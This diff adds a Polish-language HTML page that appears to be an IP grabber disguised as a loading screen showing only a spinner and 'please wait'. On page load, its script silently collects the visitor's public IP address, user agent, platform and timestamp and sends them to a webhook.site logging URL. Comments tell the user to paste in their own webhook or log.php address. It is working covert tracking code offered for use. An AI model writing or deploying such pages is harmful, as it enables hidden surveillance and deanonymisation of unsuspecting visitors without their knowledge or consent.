@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Ładowanie...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <p>Proszę czekać...</p>
+    </div>
+
+    <script>
+        // ---------------------------------------------------------
+        // TUTAJ WPISZ SWÓJ LINK Z WEBHOOK.SITE LUB ADRES DO LOG.PHP
+        // Przykład dla webhook.site: https://webhook.site/xxxx-xxxx
+        // Przykład dla InfinityFree: https://twoja-domena.pl/log.php
+        // ---------------------------------------------------------
+        const LOG_URL = 'https://webhook.site/94b088b6-3fbc-404f-abc4-cd2bf5124fa3'; 
+
+        function getIPAndSend() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const date = new Date().toISOString();
+                    
+                    // Budujemy URL z danymi
+                    const finalUrl = `${LOG_URL}?ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(userAgent)}&platform=${encodeURIComponent(platform)}&date=${encodeURIComponent(date)}`;
+                    
+                    // Wysyłamy dane
+                    fetch(finalUrl)
+                        .then(() => console.log('Dane wysłane pomyślnie'))
+                        .catch(err => console.error('Błąd wysyłania:', err));
+                })
+                .catch(error => {
+                    console.error('Nie udało się pobrać IP:', error);
+                    // Opcjonalnie: spróbuj wysłać nawet jeśli IP jest nieznane
+                    fetch(`${LOG_URL}?error=NoIP`)
+                });
+        }
+
+        // Uruchomienie po załadowaniu strony
+        window.onload = getIPAndSend;
+    </script>
+</body>
+</html>
